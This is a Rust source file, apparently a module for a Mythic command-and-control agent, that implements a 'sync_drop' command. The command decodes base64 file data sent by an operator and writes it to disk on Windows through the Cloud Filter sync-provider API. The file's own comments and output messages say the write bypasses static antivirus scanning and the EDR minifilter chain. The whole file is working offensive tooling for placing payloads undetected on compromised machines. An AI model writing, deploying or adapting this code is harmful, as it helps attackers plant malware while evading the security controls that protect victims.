use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;
use std::sync::mpsc;

#[derive(Deserialize)]
struct SyncDropArgs {
    action: String,
    sync_root: Option<String>,
    placeholder_name: Option<String>,
    file_data_b64: Option<String>,
}

#[cfg(target_os = "windows")]
pub fn sync_drop(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SyncDropArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "drop" => {
            let sync_root = args.sync_root.unwrap_or_else(|| "C:\\ProgramData\\SyncRoot".to_string());
            let placeholder = args.placeholder_name.unwrap_or_else(|| "data.bin".to_string());
            let data_b64 = match args.file_data_b64 {
                Some(d) => d,
                None => {
                    tx.send(mythic_error!(task.id, "file_data_b64 required for drop action"))?;
                    return Ok(());
                }
            };

            use base64::{Engine as _, engine::general_purpose};
            let file_data = match general_purpose::STANDARD.decode(&data_b64) {
                Ok(d) => d,
                Err(e) => {
                    tx.send(mythic_error!(task.id, format!("Base64 decode error: {}", e)))?;
                    return Ok(());
                }
            };

            // Use Puzzle SyncProvider to write file without static AV scan
            // The Cloud Filter API (CldFlt minifilter) provides the data on-demand
            // without triggering the EDR's minifilter chain
            puzzle_sync_provider::set_constants(
                sync_root.clone(),
                placeholder.clone(),
                file_data.clone(),
                Vec::new(),
                format!("{:X}", rand::random::<u64>()),
                0,
            );

            if !puzzle_sync_provider::register_sync_root() {
                tx.send(mythic_error!(task.id, "Failed to register sync root. May require admin or storage provider APIs unavailable."))?;
                return Ok(());
            }

            let conn = puzzle_sync_provider::connect_to_sync_root();
            if conn == 0 {
                tx.send(mythic_error!(task.id, "Failed to connect to sync root"))?;
                puzzle_sync_provider::unregister_sync_root();
                return Ok(());
            }

            if puzzle_sync_provider::create_placeholder() {
                tx.send(mythic_success!(task.id, format!(
                    "File dropped via SyncProvider: {}\\{} ({} bytes). File bypasses static AV scanning via Cloud Filter API.",
                    sync_root, placeholder, file_data.len()
                )))?;
            } else {
                tx.send(mythic_error!(task.id, "Failed to create placeholder file"))?;
            }

            puzzle_sync_provider::disconnect_from_sync_root(conn);
        }
        "cleanup" => {
            puzzle_sync_provider::unregister_sync_root();
            tx.send(mythic_success!(task.id, "Sync root unregistered and cleaned up"))?;
        }
        _ => {
            tx.send(mythic_error!(task.id, "Unknown action. Use: drop, cleanup"))?;
        }
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn sync_drop(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "sync_drop requires Windows"))?;
    Ok(())
}
